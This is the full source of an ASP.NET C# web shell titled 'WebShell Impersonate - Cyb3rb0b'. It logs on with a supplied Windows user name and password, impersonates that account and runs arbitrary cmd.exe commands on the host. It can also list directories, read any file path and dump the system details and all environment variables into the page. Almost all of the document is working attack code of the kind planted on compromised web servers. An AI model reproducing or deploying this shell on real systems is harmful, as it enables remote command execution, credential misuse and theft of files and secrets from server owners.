<!--
This webpage use to run all commands with parametrized user
-->

<%@ Page Language="C#" AutoEventWireup="true" %>

<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.ComponentModel" %>

<script language="c#" runat="server">

        

        [DllImport("advapi32.dll", SetLastError = true)]
    private static extern int LogonUser(
           string lpszUserName,
           string lpszDomain,
           string lpszPassword,
           int dwLogonType,
           int dwLogonProvider,
           ref IntPtr phToken);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int DuplicateToken(
        IntPtr hToken,
        int impersonationLevel,
        ref IntPtr hNewToken);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool RevertToSelf();

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    private static extern bool CloseHandle(
        IntPtr handle);

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    static extern bool  CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine,
                                   ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes,
                                   bool bInheritHandle, Int32 dwCreationFlags, IntPtr lpEnvrionment,
                                   string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
                                   ref PROCESS_INFORMATION lpProcessInformation);


    private const int LOGON32_LOGON_INTERACTIVE = 2;
    private const int LOGON32_PROVIDER_DEFAULT = 0;

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public Int32 dwProcessID;
        public Int32 dwThreadID;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public Int32 Length;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    public enum SECURITY_IMPERSONATION_LEVEL
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }


    class Impersonator : IDisposable
    {
        public IntPtr token;
        private WindowsImpersonationContext impersonationContext = null;


        public Impersonator(string userName, string domainName, string password)
        {
            ImpersonateValidUser(userName, domainName, password);
        }

        public void Dispose()
        {
            this.UndoImpersonation();
        }


        private void ImpersonateValidUser(
                string userName,
                string domain,
                string password)
        {
            WindowsIdentity tempWindowsIdentity = null;
            IntPtr token = IntPtr.Zero;
            IntPtr tokenDuplicate = IntPtr.Zero;

            try
            {
                if (RevertToSelf())
                {
                    if (LogonUser(
                        userName,
                        domain,
                        password,
                        LOGON32_LOGON_INTERACTIVE,
                        LOGON32_PROVIDER_DEFAULT,
                        ref token) != 0)
                    {
                        if (DuplicateToken(token, 2, ref tokenDuplicate) != 0)
                        {
                            tempWindowsIdentity = new WindowsIdentity(tokenDuplicate);
                            impersonationContext = tempWindowsIdentity.Impersonate();



                        }
                        else
                        {
                            throw new Win32Exception(Marshal.GetLastWin32Error());
                        }
                    }
                    else
                    {
                        throw new Win32Exception(Marshal.GetLastWin32Error());
                    }
                }
                else
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }
            }
            finally
            {
                if (token != IntPtr.Zero)
                {
                    CloseHandle(token);
                }
                if (tokenDuplicate != IntPtr.Zero)
                {
                    token = tokenDuplicate;

                    CloseHandle(tokenDuplicate);
                }
            }
        }

        /// <summary>
        /// Reverts the impersonation.
        /// </summary>
        private void UndoImpersonation()
        {
            if (impersonationContext != null)
            {
                impersonationContext.Undo();
            }
        }
    }
    void Page_Load(object sender, EventArgs e)
    {

        if (!IsPostBack)
        {

        }
    }

    void start()
    {
        string folder = Server.MapPath("~");
        StringBuilder sbl = new StringBuilder();
        sbl.Append("<table>");
        sbl.AppendFormat("<tr><td>Machine Name</td><td> {0}</td></tr>", Environment.MachineName);
        sbl.AppendLine();
        sbl.AppendFormat("<tr><td>Os Version</td><td> {0}</td></tr>", Environment.OSVersion);
        sbl.AppendLine();
        sbl.AppendFormat("<tr><td>User Domain Name</td><td> {0}</td></tr>", Environment.UserDomainName);
        sbl.AppendLine();
        sbl.AppendFormat("<tr><td>User Name</td><td> {0}</td></tr>", Environment.UserName);
        sbl.AppendLine();
        sbl.AppendFormat("<tr><td>Current Folder</td><td> {0}</td></tr></table>", folder);



        IDictionary environmentVariables = Environment.GetEnvironmentVariables();
        foreach (DictionaryEntry de in environmentVariables)
        {
            sbl.AppendLine();
            sbl.AppendFormat("<tr><td>{0}</td><td> {1}</td></tr></table>", de.Key, de.Value);
            Console.WriteLine("  {0} = {1}", de.Key, de.Value);
        }


        this.dvResult.InnerHtml += sbl.ToString() + "<hr/>";
    }
    void readfile()
    {
        string[] commands = this.txtCommand.Text.Split(new char[] { ' ' });
        string content = File.ReadAllText(commands[1]);
        this.dvResult.InnerHtml = content;
    }
    void dir()
    {
        StringBuilder sbl = new StringBuilder();
        try
        {
            string[] folder = this.txtCommand.Text.Split(new char[] { ' ' });
            string[] files = Directory.GetFiles(folder[1]);
            string[] directories = Directory.GetDirectories(folder[1]);
            sbl.Append("<h3>Directories</h3>");
            sbl.Append("<table>");
            foreach (string d in directories)
            {
                sbl.AppendFormat("<tr><td>{0}</td></tr>", d);
            }
            sbl.Append("</table>");
            sbl.Append("<hr/>");
            sbl.Append("<h3>Files</h3>");
            sbl.Append("<table>");

            foreach (string f in files)
            {
                sbl.AppendFormat("<tr><td>{0}</td></tr>", f);
            }
            sbl.Append("</table>");

        }
        catch(Exception ex)
        {
            sbl.Append("<div style='color:red'>" + ex.Message + "</div>");
        }

        this.dvResult.InnerHtml += sbl.ToString() + "<hr/>";
    }



    private void addResult(string result)
    {
        this.dvResult.InnerHtml = "<hr/><div style='color:yellow'>" + DateTime.Now.ToString("HH:MM:ss") + "</div>" + result +
            this.dvResult.InnerHtml;
    }

    void cmd()
    {
        this.dvResult.InnerHtml = String.Empty;
        var str = this.txtPassword.Text;
        var pwd = new System.Security.SecureString();
        foreach (char c in str) pwd.AppendChar(c);


        ProcessStartInfo psi = new ProcessStartInfo();
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;

        psi.UseShellExecute = false;

        Process p = new Process();
        

        psi.WorkingDirectory = @"C:\windows\system32";
        psi.FileName = @"C:\windows\system32\cmd.exe";
        psi.UserName = this.txtUserName.Text;
        psi.Domain = this.txtDomain.Text;
        psi.Password = pwd;
        psi.Verb = "runas";
        psi.Arguments = @"/c " + this.txtarguments.Text;
        var proc = new Process();
        proc.StartInfo = psi;

        this.dvResult.InnerHtml += "Try to run " + psi.FileName + psi.Arguments + " with " + psi.UserName + " username";
        if (proc.Start())
        {
            this.dvResult.InnerHtml += "<div style='color:white' >Running</div>";
        }

        StreamReader myStreamReader = proc.StandardError;
        string error = myStreamReader.ReadToEnd();

        StreamReader stmrdr = proc.StandardOutput;
        string s = stmrdr.ReadToEnd();
        stmrdr.Close();

        if (myStreamReader != null)
        {
            myStreamReader.Close();
        }


        this.dvResult.InnerHtml += "<div style='color:red'>Error: " + error + "</div>"; ;
        this.dvResult.InnerHtml += "<div style='color:Green'>Info: " + error + "</div>"; ;





    }
    void cmdExe_Click(object sender, System.EventArgs e)
    {

        try
        {
            if (this.txtCommand.Text.StartsWith("cmd"))
            {
                this.cmd();
            }
            else
            {
                using (var impersonate = new Impersonator(this.txtUserName.Text, this.txtDomain.Text, this.txtPassword.Text))
                {
                    this.dvResult.InnerHtml = "Runing as: <b>" + this.txtUserName.Text + "</b>";

                    if (this.txtCommand.Text.Equals("start"))
                    {
                        this.start();
                    }
                    else if (this.txtCommand.Text.StartsWith("dir"))
                    {
                        this.dir();
                    }
                    else if (this.txtCommand.Text.StartsWith("read"))
                    {
                        this.readfile();
                    }
                    else if (this.txtCommand.Text.StartsWith("cmd2"))
                    {

                    }
                    else
                    {
                        var pi = new PROCESS_INFORMATION();
                        var sa = new SECURITY_ATTRIBUTES();
                        sa.Length = Marshal.SizeOf(sa);
                        var si = new STARTUPINFO();
                        si.cb = Marshal.SizeOf(si);
                        si.lpDesktop = "";

                        this.dvResult.InnerHtml = String.Empty;
                        bool created = CreateProcessAsUser(impersonate.token, "c:\\windows\\system32\\cmd.exe","/c whoami", ref sa, ref sa, false, 0, IntPtr.Zero, "c:\\windows\\system32\\", ref si, ref pi);

                    }

                }
            }



        }
        catch (Win32Exception wex)
        {
            this.dvResult.InnerHtml += "<div style='font-color:red'>User name or password is invalid</div>";
        }

    }


</script>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>WebShell Impersonate - Cyb3rb0b</title>

    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link href="//netdna.bootstrapcdn.com/bootstrap/3.1.0/css/bootstrap.min.css" rel="stylesheet" />
    <script src="//code.jquery.com/jquery-1.11.1.min.js"></script>

    <script src="//netdna.bootstrapcdn.com/bootstrap/3.1.0/js/bootstrap.min.js"></script>
    <style>
        .content{
            margin-left:20px;
        }
    </style>
</head>
<body id="body" runat="server">
    <form id="form1" runat="server" class="content">
        
        <div class="row">
            <div class="col-md-12">
                 <b>Available Commands:</b>
               
            </div>
            <div class="row">
                <div class="col-md-1">
                    dir PathFolder
              
                </div>
                <div class="col-md-2">
                    start : Get all system information
                </div>
                <div class="col-md-2">
                    cmd: Run cmd.exe with current arguments
                </div>
            </div>
        </div>
        <div class="row">
            <div class="col-md-12">
                <div id="dvResult" style="height:500px; background-color: #000000; color: #FFF" runat="server" class="">
            </div>
            </div>
            
        </div>

        <hr />
        <div class="row">

            <div class="col-md-1">
                Domain
            </div>

            <div class="col-md-2">
                <asp:TextBox ID="txtDomain" runat="server"></asp:TextBox>
            </div>
            <div class="col-md-1">
                UserName
            </div>
            <div class="col-md-2">
                <asp:TextBox ID="txtUserName" runat="server"></asp:TextBox>
            </div>
            <div class="col-md-1">
                Password
            </div>
            <div class="col-md-2">
                <asp:TextBox ID="txtPassword" runat="server"></asp:TextBox>
            </div>

        </div>
        <hr />
        <div class="row">
            <div class="col-md-1">
                Command: 
            </div>
            <div class="col-md-1">
                <asp:TextBox ID="txtCommand" runat="server" Style="width: 100%"></asp:TextBox>
            </div>
            <div class="col-md-6">
                <asp:TextBox ID="txtarguments" runat="server" Style="width: 100%"></asp:TextBox>
            </div>
            <div class="col-md-1">
                <asp:Button ID="cmdRun" runat="server" OnClick="cmdExe_Click" Text="Run" CssClass="btn btn-success" />
            </div>

        </div>

    </form>
</body>
</html>
